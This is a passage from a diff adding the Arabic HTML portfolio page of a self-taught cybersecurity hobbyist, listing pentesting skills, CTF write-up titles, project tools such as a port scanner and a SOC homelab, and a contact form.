@@ -1,0 +1,1144 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#07110d">
+    <meta name="color-scheme" content="dark light">
+    <meta name="robots" content="index, follow">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Ft7y.Sec | محمد فتحي - Cybersecurity Portfolio">
+    <meta property="og:description" content="محمد فتحي — Cybersecurity, Pentesting, Python وWeb Security.">
+    <meta property="og:image" content="1790099895203.png">
+    <meta name="description" content="محمد فتحي (Ft7y.Sec) - باحث ومهتم بالأمن السيبراني، اختبار الاختراق، وتطوير أدوات بايثون الأمنية. الموقع الشخصي ومعرض المشاريع والتقارير.">
+    <meta name="keywords" content="محمد فتحي, أمن سيبراني, اختبار اختراق, بايثون, تقارير ثغرات, Mohamed Fathi, Ft7y, Cybersecurity, Pentesting">
+    <title>Ft7y.Sec | محمد فتحي - باحث أمن المعلومات</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="avatar.png" type="image/png">
+</head>
+
+<body>
+    <a class="skip-link" href="#home">تخطي إلى المحتوى</a>
+    <div class="scroll-progress" id="scroll-progress" aria-hidden="true"></div>
+    <div class="page-noise" aria-hidden="true"></div>
+    <!-- Particle Canvas Background -->
+    <canvas id="particles-canvas"></canvas>
+
+    <!-- شريط التنقل العلوي -->
+    <header class="navbar" id="navbar">
+        <div class="logo">
+            <a href="#home">Ft7y<span>.Sec</span></a>
+        </div>
+
+        <nav class="nav-links" id="nav-menu">
+            <ul>
+                <li><a href="#home" class="active">الرئيسية</a></li>
+                <li><a href="#about">من أنا</a></li>
+                <li><a href="#skills">المهارات</a></li>
+                <li><a href="#ctf-writeups">CTF Write-ups</a></li>
+                <li><a href="#stats">الإحصائيات</a></li>
+                <li><a href="#projects">المشاريع</a></li>
+                <li><a href="#contact">تواصل معي</a></li>
+            </ul>
+        </nav>
+
+        <div class="nav-actions">
+            <button id="theme-toggle" class="btn-secondary" title="تبديل الوضع">
+                <i class="fa-solid fa-moon"></i>
+            </button>
+            <button class="mobile-toggle" id="mobile-toggle" aria-label="القائمة">
+                <i class="fa-solid fa-bars"></i>
+            </button>
+        </div>
+    </header>
+
+    <main>
+        <!-- 1. قسم البداية (Hero Section) -->
+        <section id="home" class="hero-section">
+            <canvas id="matrix-canvas"></canvas>
+            <div class="hero-content" data-aos="fade-right" data-aos-duration="1000">
+                <div class="terminal-badge">
+                    <span class="terminal-status" aria-hidden="true"></span><span class="term-prefix">root@ft7y:~$</span>
+                    <span class="typed-text" id="typed-text"></span>
+                    <span class="cursor-blink">|</span>
+                </div>
+                <h1 class="glitch-text" data-text="محمد فتحي">محمد فتحي</h1>
+                <span class="badge">Cybersecurity &amp; Web Developer</span>
+                
+                <h2 class="hero-title">باحث ومهتم باختبارات الاختراق وأكتشاف الثغرات في الأنظمة</h2>
+                <p class="hero-desc">
+                    <strong>طالب وباحث هاوي غير أكاديمي مهتم بمجال أمن المعلومات واستكشاف كيف يقوم القراصنة باقتحام الأنظمة الرقمية وكسر منطقها، أسعى لتوثيق رحلتي في التعلم الذاتي ومشاركة المقالات والتقارير التقنية حول الثغرات وطرق الحماية، مع تطوير أدوات برمجية مخصصة للأتمتة والفحص.</strong>
+                </p>
+                <div class="hero-actions">
+                    <a href="#contact" class="btn-primary"><i class="fa-solid fa-paper-plane"></i> تواصل معي</a>
+                    <a href="#ctf-writeups" class="btn-outline"><i class="fa-solid fa-flag"></i> تصفح CTF Write-ups</a>
+                </div>
+                <a class="hero-scroll-cue" href="#about" aria-label="انتقل إلى قسم من أنا">
+                    <span>SCROLL TO EXPLORE</span>
+                    <i class="fa-solid fa-arrow-down"></i>
+                </a>
+            </div>
+
+            <!-- الصورة الشخصية -->
+            <div class="hero-image" data-aos="fade-left" data-aos-duration="1000">
+                <div class="avatar-ring">
+                    <div class="ring ring-1"></div>
+                    <div class="ring ring-2"></div>
+                    <div class="ring ring-3"></div>
+                    <div class="avatar-box">
+                        <img src="1790099895203.png" alt="صورة محمد فتحي">
+                    </div>
+                </div>
+                <div class="floating-badges">
+                    <div class="float-badge" style="--delay:0s"><i class="fa-solid fa-shield-halved"></i> Pentester</div>
+                    <div class="float-badge" style="--delay:1s"><i class="fa-brands fa-python"></i> Web Developer</div>
+                    <div class="float-badge" style="--delay:2s"><i class="fa-solid fa-flag"></i> CTF Player</div>
+
+                </div>
+                <div class="social-icons">
+                    <a href="https://github.com/FySouL22" target="_blank" aria-label="GitHub"><i class="fa-brands fa-github"></i></a>
+                    <a href="https://www.linkedin.com/in/m-fysoul-ft7y/" target="_blank" aria-label="LinkedIn"><i class="fa-brands fa-linkedin"></i></a>
+                    <a href="https://t.me/ft7y4u" target="_blank" aria-label="Telegram"><i class="fa-brands fa-telegram"></i></a>
+                    <a href="mailto:ft7y.sec@proton.me" aria-label="Email"><i class="fa-solid fa-envelope"></i></a>
+                    <a href="https://tryhackme.com/p/bbibo7909" target="_blank" aria-label="TryHackMe">
+                     <i class="fa-solid fa-shield-halved"></i>
+                    </a>
+                    <a href="https://profile.hackthebox.com/" target="_blank" aria-label="HackTheBox">
+                        <svg class="htb-icon" viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+                            <path d="M12 0L1.605 6v12L12 24l10.395-6V6L12 0zm0 2.278l8.4 4.845v9.754L12 21.722l-8.4-4.845V7.123L12 2.278zm0 3.754L6.002 9.43l5.998 3.46 5.998-3.46L12 6.032zm-6.857 4.545v6.918l5.943 3.431V17.92L5.143 10.577zm13.714 0l-5.943 3.431v3.424l5.943-3.431v-6.924z"/>
+                        </svg>
+                    </a>
+                </div>
+            </div>
+        </section>
+
+        <!-- 2. قسم "من أنا" (About Section) -->
+        <section id="about" class="content-section">
+            <div class="section-header" data-aos="fade-up" data-aos-duration="800">
+                <span class="section-tag">About Me</span>
+                <h2 class="section-title">رحلتي في أمن المعلومات</h2>
+                <div class="section-divider"></div>
+            </div>
+
+            <div class="about-container">
+                <div class="about-card main-bio" data-aos="fade-right" data-aos-duration="1000">
+                    <div class="code-block-header">
+                        <span class="dot red"></span>
+                        <span class="dot yellow"></span>
+                        <span class="dot green"></span>
+                        <span class="code-file">about_me.py</span>
+                    </div>
+                    <p class="bio-lead">
+                        مرحباً بك! أنا <strong>محمد فتحي</strong>، باحث مستقل ومتعلم ذاتي اعتمد على اسلوب البحث والتجربة في مجال الأمن السيبراني واختبار اختراق الأنظمة والشبكات (Penetration Testing).
+                        اقوم بالتعلم والتدريب من داخل مختبري الشخصي الذي قمت باعداده محليا لمحاكاة معظم الهجمات السيبرانية لفهم كيفية عملها للحد من الاخطار المحتملة 
+                    </p>
+                    <p>
+                        شغفي بدأ من الرغبة العميقة في فهم كيفية عمل الأنظمة الحاسوبية وبروتوكولات الشبكات من الداخل، وكيف يفكر المهاجمون لاكتشاف نقاط الضعف، مما يمكنني من بناء استراتيجيات دفاعية قوية وسد الثغرات قبل أن تُستغل.
+                    </p>
+                    <p>
+                        أقضي معظم وقتي في حل تحديات الـ CTF، ودراسة معايير الـ OWASP لأمن تطبيقات الويب، وبرمجة أدوات وسكربتات بلغة Python لتسهيل وأتمتة مراحل جمع المعلومات وفحص الأنظمة.
+                    </p>
+                </div>
+
+                <div class="about-highlights" data-aos="fade-left" data-aos-duration="1000">
+                    <div class="highlight-box">
+                        <div class="highlight-icon"><i class="fa-solid fa-shield-halved"></i></div>
+                        <div class="highlight-text">
+                            <h3>الأمن الهجومي والدفاعي</h3>
+                            <p>دراسة أساليب Red Teaming وتقييم الثغرات لتحسين منظومة الحماية والاستجابة للتهديدات.</p>
+                        </div>
+                    </div>
+
+                    <div class="highlight-box">
+                        <div class="highlight-icon"><i class="fa-brands fa-python"></i></div>
+                        <div class="highlight-text">
+                            <h3>الأتمتة والبرمجة</h3>
+                            <p>بناء أدوات فحص سريعة باستخدام Python للتعامل مع Sockets والشبكات ومعالجة البيانات.</p>
+                        </div>
+                    </div>
+
+                    <div class="highlight-box">
+                        <div class="highlight-icon"><i class="fa-solid fa-flag"></i></div>
+                        <div class="highlight-text">
+                            <h3>تحديات CTF والتعلم المستمر</h3>
+                            <p>التدريب المستمر على منصات TryHackMe & HackTheBox وغيرها , ومتابعة تقارير الثغرات المنشورة عالمياً.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 3. قسم المهارات والأدوات (Skills Section) -->
+        <section id="skills" class="content-section">
+            <div class="section-header" data-aos="fade-up" data-aos-duration="800">
+                <span class="section-tag">Skills &amp; Tools</span>
+                <h2 class="section-title">المهارات التقنية</h2>
+                <div class="section-divider"></div>
+            </div>
+
+            <div class="skills-grid">
+                <a href="pentest.html" class="skill-category-card" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <div class="card-top-row">
+                        <div class="card-icon"><i class="fa-solid fa-network-wired"></i></div>
+                        <span class="portal-badge"><i class="fa-solid fa-terminal"></i> 10+ أدوات وأوامر</span>
+                    </div>
+                    <h3>اختبار الاختراق والشبكات</h3>
+                    <p class="category-desc">مسح الشبكات واكتشاف المنافذ والخدمات وتحليل البروتوكولات وفحص الثغرات.</p>
+                    <ul class="skill-items">
+                        <li><span>Nmap &amp; TShark</span></li>
+                        <li><span>Wireshark</span></li>
+                        <li><span>Burp Suite</span></li>
+                        <li><span>Metasploit Framework</span></li>
+                        <li><span>Gobuster / FFuf</span></li>
+                    </ul>
+                    <div class="skill-progress-group">
+                        <div class="skill-bar-item">
+                            <span>Network Scanning</span>
+                            <div class="skill-bar"><div class="skill-fill" data-width="80%"></div></div>
+                        </div>
+                        <div class="skill-bar-item">
+                            <span>Exploitation</span>
+                            <div class="skill-bar"><div class="skill-fill" data-width="65%"></div></div>
+                        </div>
+                    </div>
+                    <div class="card-cta-btn">
+                        <span>دخول القسم واستعراض الأوامر</span>
+                        <i class="fa-solid fa-arrow-left"></i>
+                    </div>
+                </a>
+
+                <a href="appsec.html" class="skill-category-card" data-aos="fade-up" data-aos-duration="800" data-aos-delay="200">
+                    <div class="card-top-row">
+                        <div class="card-icon"><i class="fa-solid fa-bug"></i></div>
+                        <span class="portal-badge"><i class="fa-solid fa-shield-virus"></i> OWASP &amp; AppSec</span>
+                    </div>
+                    <h3>أمن تطبيقات الويب</h3>
+                    <p class="category-desc">فهم واكتشاف ثغرات الويب وفق معايير OWASP Top 10 وطرق الحماية والـ APIs.</p>
+                    <ul class="skill-items">
+                        <li><span>SQL Injection (SQLi)</span></li>
+                        <li><span>Cross-Site Scripting (XSS)</span></li>
+                        <li><span>Broken Access Control (IDOR)</span></li>
+                        <li><span>SSRF &amp; Insecure Design</span></li>
+                        <li><span>OWASP API Security</span></li>
+                    </ul>
+                    <div class="skill-progress-group">
+                        <div class="skill-bar-item">
+                            <span>Web Vulnerabilities</span>
+                            <div class="skill-bar"><div class="skill-fill" data-width="75%"></div></div>
+                        </div>
+                        <div class="skill-bar-item">
+                            <span>OWASP Top 10</span>
+                            <div class="skill-bar"><div class="skill-fill" data-width="70%"></div></div>
+                        </div>
+                    </div>
+                    <div class="card-cta-btn">
+                        <span>دخول القسم واستعراض الثغرات</span>
+                        <i class="fa-solid fa-arrow-left"></i>
+                    </div>
+                </a>
+
+                <a href="automation.html" class="skill-category-card" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300">
+                    <div class="card-top-row">
+                        <div class="card-icon"><i class="fa-brands fa-python"></i></div>
+                        <span class="portal-badge"><i class="fa-solid fa-code"></i> سكربتات وأتمتة</span>
+                    </div>
+                    <h3>البرمجة والأتمتة</h3>
+                    <p class="category-desc">تطوير سكربتات مخصصة لأتمتة مهام الفحص والاستطلاع وخطوط الـ DevSecOps.</p>
+                    <ul class="skill-items">
+                        <li><span>Python Security Scripting</span></li>
+                        <li><span>Bash Recon &amp; Automation</span></li>
+                        <li><span>PowerShell for Pentesting</span></li>
+                        <li><span>Golang Security Tools</span></li>
+                        <li><span>CI/CD Security Pipelines</span></li>
+                    </ul>
+                    <div class="skill-progress-group">
+                        <div class="skill-bar-item">
+                            <span>Python</span>
+                            <div class="skill-bar"><div class="skill-fill" data-width="85%"></div></div>
+                        </div>
+                        <div class="skill-bar-item">
+                            <span>Bash/Shell</span>
+                            <div class="skill-bar"><div class="skill-fill" data-width="60%"></div></div>
+                        </div>
+                    </div>
+                    <div class="card-cta-btn">
+                        <span>دخول القسم واستعراض الأكواد</span>
+                        <i class="fa-solid fa-arrow-left"></i>
+                    </div>
+                </a>
+
+                <a href="systems-labs.html" class="skill-category-card" data-aos="fade-up" data-aos-duration="800" data-aos-delay="400">
+                    <div class="card-top-row">
+                        <div class="card-icon"><i class="fa-brands fa-linux"></i></div>
+                        <span class="portal-badge"><i class="fa-solid fa-server"></i> معامل وسيناريوهات</span>
+                    </div>
+                    <h3>الأنظمة والمعامل</h3>
+                    <p class="category-desc">التعامل مع بيئات التشغيل الأمنية وبناء معامل Active Directory و SOC المنزلية.</p>
+                    <ul class="skill-items">
+                        <li><span>Active Directory Lab</span></li>
+                        <li><span>Linux Hardening &amp; PrivEsc</span></li>
+                        <li><span>Docker &amp; Container Security</span></li>
+                        <li><span>SOC &amp; Wazuh SIEM Lab</span></li>
+                        <li><span>Virtualization &amp; pfSense</span></li>
+                    </ul>
+                    <div class="skill-progress-group">
+                        <div class="skill-bar-item">
+                            <span>Linux Admin</span>
+                            <div class="skill-bar"><div class="skill-fill" data-width="78%"></div></div>
+                        </div>
+                        <div class="skill-bar-item">
+                            <span>Lab Setup</span>
+                            <div class="skill-bar"><div class="skill-fill" data-width="72%"></div></div>
+                        </div>
+                    </div>
+                    <div class="card-cta-btn">
+                        <span>دخول القسم واستعراض المعامل</span>
+                        <i class="fa-solid fa-arrow-left"></i>
+                    </div>
+                </a>
+            </div>
+        </section>
+
+        <!-- ====== قسم CTF Write-ups المدمج (Showcase Screen Card) ====== -->
+        <span id="ctfs" style="display:block; position:relative; top:-80px; visibility:hidden;"></span>
+        <span id="writeups" style="display:block; position:relative; top:-80px; visibility:hidden;"></span>
+        <section id="ctf-writeups" class="content-section ctf-screen-section">
+            <a href="writeups.html" class="ctf-screen-card" data-aos="zoom-in" data-aos-duration="900" aria-label="الانتقال إلى أرشيف تقارير CTF الشامل">
+                <div class="ctf-screen-card-bg-glow"></div>
+                
+                <div class="screen-card-top-bar">
+                    <div class="screen-card-tag">
+                        <span class="pulse-dot"></span>
+                        <span>أرشيف التحديات والتقارير الموثقة</span>
+                    </div>
+                    <div class="screen-card-platforms">
+                        <span class="screen-card-pchip htb"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="screen-card-pchip thm"><i class="fa-solid fa-fire"></i> TryHackMe</span>
+                        <span class="screen-card-pchip dna"><i class="fa-solid fa-dna"></i> HackerDNA</span>
+                        <span class="screen-card-pchip"><i class="fa-solid fa-globe"></i> Web &amp; DFIR</span>
+                    </div>
+                    <div class="screen-card-action-hint">
+                        <span>فتح الأرشيف الكامل</span>
+                        <i class="fa-solid fa-arrow-up-right-from-square"></i>
+                    </div>
+                </div>
+
+                <div class="screen-card-header">
+                    <h2 class="screen-card-title">
+                        <i class="fa-solid fa-flag"></i>
+                        <span>CTF Write-ups &amp; Security Reports</span>
+                    </h2>
+                    <p class="screen-card-desc">
+                        سجل متكامل وموثق خطوة بخطوة لاختبار الاختراق، حلول آلات Hack The Box و TryHackMe، وتحليلات الثغرات البرمجية والتحقيق الجنائي الرقمي بالأدلة والأوامر. اضغط على أي مكان في هذه البطاقة لاستعراض كافة التقارير مقسمة حسب كل منصة.
+                    </p>
+                </div>
+
+                <!-- صور لأهم التقارير (Featured Reports Showcase) -->
+                <div class="screen-card-gallery">
+                    <!-- 1. WingData (HTB) -->
+                    <div class="gallery-preview-item">
+                        <div class="gallery-thumb-wrap">
+                            <img src="assets/images/ctfs/wingdata-1.png" alt="تقرير WingData HTB" loading="lazy">
+                            <div class="gallery-thumb-overlay"></div>
+                            <span class="gallery-thumb-badge htb"><i class="fa-solid fa-cube"></i> HTB</span>
+                            <span class="gallery-thumb-count"><i class="fa-regular fa-image"></i> 16 لقطة</span>
+                        </div>
+                        <div class="gallery-body">
+                            <div class="gallery-title">WingData HTB Write-up</div>
+                            <div class="gallery-meta">استكشاف شبكي واستغلال الخدمات ورفع الصلاحيات الكامل.</div>
+                        </div>
+                    </div>
+
+                    <!-- 2. Facts (HTB) -->
+                    <div class="gallery-preview-item">
+                        <div class="gallery-thumb-wrap">
+                            <img src="assets/images/ctfs/facts-1.png" alt="تقرير Facts HTB" loading="lazy">
+                            <div class="gallery-thumb-overlay"></div>
+                            <span class="gallery-thumb-badge htb"><i class="fa-solid fa-cube"></i> HTB</span>
+                            <span class="gallery-thumb-count"><i class="fa-regular fa-image"></i> 13 لقطة</span>
+                        </div>
+                        <div class="gallery-body">
+                            <div class="gallery-title">Facts HTB Machine</div>
+                            <div class="gallery-meta">تحليل Web Application و CMS والوصول للبيانات الحساسة.</div>
+                        </div>
+                    </div>
+
+                    <!-- 3. Kobold (HTB) -->
+                    <div class="gallery-preview-item">
+                        <div class="gallery-thumb-wrap">
+                            <img src="assets/images/ctfs/kobold-1.png" alt="تقرير Kobold HTB" loading="lazy">
+                            <div class="gallery-thumb-overlay"></div>
+                            <span class="gallery-thumb-badge htb"><i class="fa-solid fa-cube"></i> HTB</span>
+                            <span class="gallery-thumb-count"><i class="fa-regular fa-image"></i> 7 لقطات</span>
+                        </div>
+                        <div class="gallery-body">
+                            <div class="gallery-title">Kobold HTB Machine</div>
+                            <div class="gallery-meta">تحدي Linux يركز على أدوات الذكاء الاصطناعي وبيئات Docker.</div>
+                        </div>
+                    </div>
+
+                    <!-- 4. CCTV (HTB) -->
+                    <div class="gallery-preview-item">
+                        <div class="gallery-thumb-wrap">
+                            <img src="assets/images/ctfs/cctv-writeup-1.png" alt="تقرير CCTV HTB" loading="lazy">
+                            <div class="gallery-thumb-overlay"></div>
+                            <span class="gallery-thumb-badge htb"><i class="fa-solid fa-cube"></i> HTB</span>
+                            <span class="gallery-thumb-count"><i class="fa-regular fa-image"></i> 11 لقطة</span>
+                        </div>
+                        <div class="gallery-body">
+                            <div class="gallery-title">Write-up CCTV HTB</div>
+                            <div class="gallery-meta">استغلال ثغرة Blind SQLi و motionEye RCE للحصول على Root.</div>
+                        </div>
+                    </div>
+
+                    <!-- 5. StartUP (THM) -->
+                    <div class="gallery-preview-item">
+                        <div class="gallery-thumb-wrap">
+                            <img src="assets/images/ctfs/startup-1.png" alt="تقرير StartUP THM" loading="lazy">
+                            <div class="gallery-thumb-overlay"></div>
+                            <span class="gallery-thumb-badge thm"><i class="fa-solid fa-fire"></i> THM</span>
+                            <span class="gallery-thumb-count"><i class="fa-regular fa-image"></i> 3 لقطات</span>
+                        </div>
+                        <div class="gallery-body">
+                            <div class="gallery-title">StartUP THM Machine</div>
+                            <div class="gallery-meta">تحدي Spice Hut مع مسار الاستكشاف والأوامر وتصعيد الصلاحيات.</div>
+                        </div>
+                    </div>
+
+                    <!-- 6. DevHub (HTB) -->
+                    <div class="gallery-preview-item">
+                        <div class="gallery-thumb-wrap">
+                            <img src="assets/images/ctfs/devhub-1.png" alt="تقرير DevHub HTB" loading="lazy">
+                            <div class="gallery-thumb-overlay"></div>
+                            <span class="gallery-thumb-badge htb"><i class="fa-solid fa-cube"></i> HTB</span>
+                            <span class="gallery-thumb-count"><i class="fa-regular fa-image"></i> 10 لقطات</span>
+                        </div>
+                        <div class="gallery-body">
+                            <div class="gallery-title">DevHub HTB Write-up</div>
+                            <div class="gallery-meta">توثيق عملي لاختراق آلة DevHub واستغلال مسارات المصادقة.</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="screen-card-footer">
+                    <div class="screen-card-stats">
+                        <div class="screen-cstat">
+                            <i class="fa-solid fa-cube"></i>
+                            <span>15+ آلة Hack The Box</span>
+                        </div>
+                        <div class="screen-cstat">
+                            <i class="fa-solid fa-fire"></i>
+                            <span>5+ غرف TryHackMe</span>
+                        </div>
+                        <div class="screen-cstat">
+                            <i class="fa-solid fa-shield-virus"></i>
+                            <span>تقارير الويب والتحقيق الجنائي</span>
+                        </div>
+                    </div>
+                    <div class="screen-card-launch-btn">
+                        <span>دخول الأرشيف الكامل مقسماً حسب المنصة</span>
+                        <i class="fa-solid fa-arrow-left"></i>
+                    </div>
+                </div>
+            </a>
+        </section>
+
+        <!-- 4. قسم الإحصائيات (Stats Section) -->
+        <section id="stats" class="content-section stats-section">
+            <div class="section-header" data-aos="fade-up" data-aos-duration="800">
+                <span class="section-tag">Achievements</span>
+                <h2 class="section-title">الإنجازات والأرقام</h2>
+                <div class="section-divider"></div>
+            </div>
+            <div class="stats-grid">
+                <div class="stat-card" data-aos="zoom-in" data-aos-delay="0">
+                    <div class="stat-icon"><i class="fa-solid fa-fire"></i></div>
+                    <div class="stat-number" data-target="50">0</div>
+                    <div class="stat-label">غرفة TryHackMe</div>
+                </div>
+                <div class="stat-card" data-aos="zoom-in" data-aos-delay="100">
+                    <div class="stat-icon"><i class="fa-solid fa-cube"></i></div>
+                    <div class="stat-number" data-target="15">0</div>
+                    <div class="stat-label">آلة HackTheBox</div>
+                </div>
+                <div class="stat-card" data-aos="zoom-in" data-aos-delay="200">
+                    <div class="stat-icon"><i class="fa-solid fa-flag"></i></div>
+                    <div class="stat-number" data-target="30">0</div>
+                    <div class="stat-label">تحدي CTF محلول</div>
+                </div>
+                <div class="stat-card" data-aos="zoom-in" data-aos-delay="300">
+                    <div class="stat-icon"><i class="fa-brands fa-python"></i></div>
+                    <div class="stat-number" data-target="10">0</div>
+                    <div class="stat-label">أداة برمجية</div>
+                </div>
+                <div class="stat-card" data-aos="zoom-in" data-aos-delay="400">
+                    <div class="stat-icon"><i class="fa-solid fa-file-alt"></i></div>
+                    <div class="stat-number" data-target="20">0</div>
+                    <div class="stat-label">تقرير ثغرة</div>
+                </div>
+                <div class="stat-card" data-aos="zoom-in" data-aos-delay="500">
+                    <div class="stat-icon"><i class="fa-solid fa-certificate"></i></div>
+                    <div class="stat-number" data-target="5">0</div>
+                    <div class="stat-label">شهادة تعليمية</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 5. قسم المشاريع (Projects Section) -->
+        <section id="projects" class="content-section">
+            <div class="section-header" data-aos="fade-up" data-aos-duration="800">
+                <span class="section-tag">Portfolio</span>
+                <h2 class="section-title">المشاريع والأدوات</h2>
+                <div class="section-divider"></div>
+            </div>
+
+            <div class="projects-grid">
+                <div class="project-card" data-aos="zoom-in" data-aos-duration="800" data-aos-delay="0">
+                    <div class="project-top">
+                        <span class="project-badge"><i class="fa-brands fa-python"></i> CLI Tool</span>
+                        <a href="https://github.com/FySouL22/pyport-scanner-pro" target="_blank" rel="noopener noreferrer" class="icon-link" title="مستودع GitHub"><i class="fa-brands fa-github"></i></a>
+                    </div>
+                    <h3 class="project-title"><a href="pyport-scanner.html" style="color: inherit; text-decoration: none;">PyPort-Scanner Pro</a></h3>
+                    <p class="project-desc">
+                        فاحص منافذ متعدد الخيوط (Multi-threaded) بلغة Python يتميز بالسرعة العالية في اكتشاف المنافذ المفتوحة والتقاط البانر (Banner Grabbing) لتحديد نوع الخدمات العاملة مع محاكي ويب فوري.
+                    </p>
+                    <div class="project-tech">
+                        <span>Python</span>
+                        <span>Sockets</span>
+                        <span>Threading</span>
+                        <span>Banner Grabbing</span>
+                    </div>
+                    <div class="project-actions">
+                        <a href="pyport-scanner.html" class="btn-text" style="color: var(--accent-color); font-weight: 700;">تشغيل واستعراض الأداة <i class="fa-solid fa-arrow-left"></i></a>
+                        <a href="https://github.com/FySouL22/pyport-scanner-pro" target="_blank" rel="noopener noreferrer" class="btn-text" style="font-size: 13px;"><i class="fa-brands fa-github"></i> GitHub</a>
+                    </div>
+                </div>
+
+                <div class="project-card" data-aos="zoom-in" data-aos-duration="800" data-aos-delay="100">
+                    <div class="project-top">
+                        <span class="project-badge"><i class="fa-solid fa-magnifying-glass"></i> OSINT Tool</span>
+                        <a href="https://github.com/FySouL22/subdomain-reckoner" target="_blank" rel="noopener noreferrer" class="icon-link" title="مستودع GitHub"><i class="fa-brands fa-github"></i></a>
+                    </div>
+                    <h3 class="project-title"><a href="subdomain-reckoner.html" style="color: inherit; text-decoration: none;">SubDomain Reckoner</a></h3>
+                    <p class="project-desc">
+                        أداة استطلاع وجمع النطاقات الفرعية آلياً من شهادات الأمان (crt.sh) وسجلات DNS العامة وفحص استجابتها مع حفظ النتائج في تقارير مرتبة ومحاكي استكشاف مباشر.
+                    </p>
+                    <div class="project-tech">
+                        <span>Python 3</span>
+                        <span>crt.sh API</span>
+                        <span>OSINT</span>
+                        <span>HTTP Prober</span>
+                    </div>
+                    <div class="project-actions">
+                        <a href="subdomain-reckoner.html" class="btn-text" style="color: var(--accent-color); font-weight: 700;">تشغيل واستعراض الأداة <i class="fa-solid fa-arrow-left"></i></a>
+                        <a href="https://github.com/FySouL22/subdomain-reckoner" target="_blank" rel="noopener noreferrer" class="btn-text" style="font-size: 13px;"><i class="fa-brands fa-github"></i> GitHub</a>
+                    </div>
+                </div>
+
+                <div class="project-card" data-aos="zoom-in" data-aos-duration="800" data-aos-delay="200">
+                    <div class="project-top">
+                        <span class="project-badge"><i class="fa-solid fa-shield-halved"></i> Virtual Lab &amp; SIEM</span>
+                        <a href="https://github.com/FySouL22/cyber-defense-homelab" target="_blank" rel="noopener noreferrer" class="icon-link" title="مستودع GitHub"><i class="fa-brands fa-github"></i></a>
+                    </div>
+                    <h3 class="project-title"><a href="homelab-defense.html" style="color: inherit; text-decoration: none;">Cyber Defense &amp; SOC HomeLab</a></h3>
+                    <p class="project-desc">
+                        بيئة معملية وأداة أتمتة لنشر خوادم Wazuh SIEM ومراقبة حركة البيانات وربط سجلات أحداث Sysmon ومحاكاة هجمات الشبكات مع لوحة تنبيهات تفاعلية.
+                    </p>
+                    <div class="project-tech">
+                        <span>Wazuh SIEM</span>
+                        <span>Docker</span>
+                        <span>Sysmon</span>
+                        <span>Active Directory</span>
+                    </div>
+                    <div class="project-actions">
+                        <a href="homelab-defense.html" class="btn-text" style="color: var(--accent-color); font-weight: 700;">استعراض المعمل والمحاكي <i class="fa-solid fa-arrow-left"></i></a>
+                        <a href="https://github.com/FySouL22/cyber-defense-homelab" target="_blank" rel="noopener noreferrer" class="btn-text" style="font-size: 13px;"><i class="fa-brands fa-github"></i> GitHub</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+<!-- 7. قسم تواصل معي (Contact Section) -->
+        <section id="contact" class="content-section">
+            <div class="section-header" data-aos="fade-up" data-aos-duration="800">
+                <span class="section-tag">Get In Touch</span>
+                <h2 class="section-title">تواصل معي</h2>
+                <div class="section-divider"></div>
+            </div>
+
+            <div class="contact-grid">
+                <div class="contact-info" data-aos="fade-right" data-aos-duration="1000">
+                    <h3>يسعدني تواصلك دائماً</h3>
+                    <p>
+                        سواء كنت تبحث عن استشارة أمنية، ترغب في التعاون في مشروع أو أداة برمجية، أو مناقشة ثغرة تقنية، لا تتردد في مراسلتي.
+                    </p>
+
+                    <div class="contact-list">
+                        <div class="contact-item">
+                            <div class="c-icon"><i class="fa-solid fa-envelope"></i></div>
+                            <div class="c-details">
+                                <span class="c-title">البريد الإلكتروني</span>
+                                <span class="c-val" id="email-text">ft7y.sec@proton.me</span>
+                            </div>
+                            <button id="copy-email-btn" class="c-copy" title="نسخ البريد">
+                                <i class="fa-regular fa-copy"></i>
+                            </button>
+                        </div>
+
+                        <div class="contact-item">
+                            <div class="c-icon"><i class="fa-solid fa-location-dot"></i></div>
+                            <div class="c-details">
+                                <span class="c-title">الموقع</span>
+                                <span class="c-val">مصر (Egypt) - متاح للعمل عن بُعد</span>
+                            </div>
+                        </div>
+
+                        <div class="contact-item">
+                            <div class="c-icon"><i class="fa-solid fa-shield-halved"></i></div>
+                            <div class="c-details">
+                                <span class="c-title">الحالة</span>
+                                <span class="c-val active-status"><span class="pulse-dot"></span> جاهز للمشاريع والتدريب</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="social-links">
+                        <a href="https://github.com" target="_blank" rel="noopener noreferrer" title="GitHub"><i class="fa-brands fa-github"></i></a>
+                        <a href="https://linkedin.com" target="_blank" rel="noopener noreferrer" title="LinkedIn"><i class="fa-brands fa-linkedin-in"></i></a>
+                        <a href="https://tryhackme.com" target="_blank" rel="noopener noreferrer" title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+                        <a href="https://t.me/your-username" target="_blank" rel="noopener noreferrer" title="Telegram"><i class="fa-brands fa-telegram"></i></a>
+                    </div>
+                </div>
+
+                <div class="contact-form-container" data-aos="fade-left" data-aos-duration="1000">
+                    <form id="contact-form" class="clean-form">
+                        <div class="form-group">
+                            <label for="name">الاسم:</label>
+                            <input type="text" id="name" name="name" required placeholder="اسمك أو المعرّف الشخصي">
+                        </div>
+                        <div class="form-group">
+                            <label for="email">البريد الإلكتروني:</label>
+                            <input type="email" id="email" name="email" required placeholder="name@domain.com">
+                        </div>
+                        <div class="form-group">
+                            <label for="subject">الموضوع:</label>
